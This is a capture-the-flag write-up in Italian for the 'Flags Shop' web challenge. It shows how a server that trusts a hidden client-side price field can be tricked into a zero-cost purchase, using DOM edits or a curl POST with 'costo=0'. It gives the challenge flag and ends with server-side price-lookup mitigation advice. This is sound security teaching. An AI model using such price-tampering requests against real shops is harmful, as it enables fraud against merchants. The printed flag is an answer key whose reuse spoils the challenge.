# Writeup Challenge: Flags Shop

**Target:** `[http://shops.challs.olicyber.it/](http://shops.challs.olicyber.it/)`

**Flag:** `flag{gr4zi3_p3r_l_4cqu1st0}`

**Categoria:** Web Security / Insecure Direct Object References (IDOR) & Parameter Tampering (Business Logic Flaw)

---

### Obiettivo

Acquistare la **"Bandiera anonymous"** dal valore di **1000 €** disponendo di un budget iniziale limitato a soli **100 €**.

---

### Analisi della Vulnerabilità

1. **Tipologia:** Non si tratta di XSS o CSRF, ma di una vulnerabilità di **Parameter Tampering** dovuta a un **Broken Business Logic Flaw / Insecure Client-Side Trust**.
2. **Affidamento Cieco all'Input Client:**
Il form di acquisto invia via `POST` verso `buy.php` due parametri controllati interamente dal client:

```html
<form action="buy.php" method="POST">
    <input type="hidden" name="id" value="2">
    <input type="hidden" name="costo" value="1000">
    <button type="submit">ACQUISTA</button>
</form>

```

Il backend riceve il parametro `costo` direttamente dal body della richiesta HTTP invece di ricavarlo in modo sicuro da una tabella/database interno associato all'`id` del prodotto.

---

### Risoluzione ed Exploitation

Poiché i campi `input type="hidden"` risiedono nel DOM del browser, possono essere modificati liberamente prima dell'invio.

#### Metodo 1: Modifica del DOM tramite DevTools

1. Ispezione dell'elemento del form della terza card (**Bandiera anonymous**, `id=2`).
2. Modifica dell'attributo `value` dell'input `costo`:

```html
<!-- Da: -->
<input type="hidden" name="costo" value="1000">
<!-- A: -->
<input type="hidden" name="costo" value="0">

```

1. Pressione del pulsante **ACQUISTA**.

#### Metodo 2: Richiesta HTTP diretta via `curl`

In alternativa, l'invio diretto del payload manomesso tramite richiesta `POST`:

```bash
curl -X POST http://shops.challs.olicyber.it/buy.php -d "id=2&costo=0"

```

---

### Risultato

Il backend ha validato l'acquisto per l'oggetto `id=2` sottraendo il nuovo costo manipolato (`0 €`) dal saldo residuo (`100 €`), restituendo il messaggio con la flag:

```text
Ci hai truffati, ne siamo sicuri. Non ti daremo la preziosa bandiera degli anonymous ma questa: flag{gr4zi3_p3r_l_4cqu1st0}

```

---

### Mitigazione (Best Practice)

I dati sensibili relativi al modello di business (prezzi, sconti, inventario) non devono **mai** essere inviati dal client o accettati ciecamente dal server:

* Il client deve inviare unicamente l'identificativo del prodotto (`id=2`).
* Il backend deve recuperare il prezzo autoritativo dal database lato server ed eseguire lì la verifica del saldo:

```php
$product_id = $_POST['id'];
$price = get_price_from_database($product_id); // Lookup sicuro lato server
if ($user_balance >= $price) { ... }

```
